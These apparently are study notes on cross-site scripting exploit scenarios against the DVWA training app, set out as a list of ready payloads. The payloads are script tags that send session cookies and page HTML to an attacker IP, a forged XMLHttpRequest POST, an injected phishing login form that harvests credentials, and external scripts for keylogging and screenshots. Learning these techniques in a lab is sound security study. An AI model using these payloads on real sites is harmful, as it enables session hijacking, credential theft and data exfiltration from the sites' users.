## <u>Exploit Scenarios</u>

**1. Session Hijacking**

- Steal Session Cookies : document.cookie

  Eg. Payload - 

  ```
  <script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
  ```

**2. Perform Unauthorized Activities**

- If *HTTPOnly* flag on Cookies, can't steal them through Js

- Eg. Forge an HTTP POST request to post something like a comment. 

  ```
  <script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
  </script>
  ```

  -  Creating a **XMLHTTPRequest** object and setting the necessary header and data

**3. Phishing** 

- can be used to inject a form into the vulnerable page and use this form to collect user credentials

- Eg. 

  ```
  <h3>Please login to proceed</h3> <form action=URL>
  Username:<br><input type="username" name="username"></br>
  Password:<br><input type="password" name="password"></br><br>
  <input type="submit" value="Logon"></br>
  ```

  - Sends the creds over to the Attacker Server(URL)

**4. KeyLogger**

- Creating a malicious Js file and hosting it on an attacker controlled Server


  - On every keypress a new XMLHTTPRequest is made to the attacker server *(keylog.php)* with the logged keystrokes


    - The *keylog.php* file will write all the keystrokes to *data.txt*

  - Now, just calling the hosted js from the attacker server

    ```
    <script src="http://192.168.149.128/xss.js">
    ```

**4. Stealing Sensitive Information**

- Eg. An Internet banking application is vulnerable to XSS, the attacker could read the current balance, transaction information, personal data, etc.
- Here, we'll host a Script on the Attacker controlled Server containing logic to take the page Screenshot
- And a PHP Script to save the contents to a PNG file:


- Final Injection Payload:

  ```
  <script src="http://192.168.149.128/screenshot.js">
  ```

  #### 

  #### <u>**Alternative Way**</u>

  - Another way to steal the page content would be to get the HTML source code by using **getElementById**

  - Eg. 

    ```
    <script>new Image().src="http://192.168.149.128/bogus.php?output="+document.getElementById('guestbook_comments').innerHTML;</script>
    
    // or even the entire page source :
    
    <script>new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script>
    ```
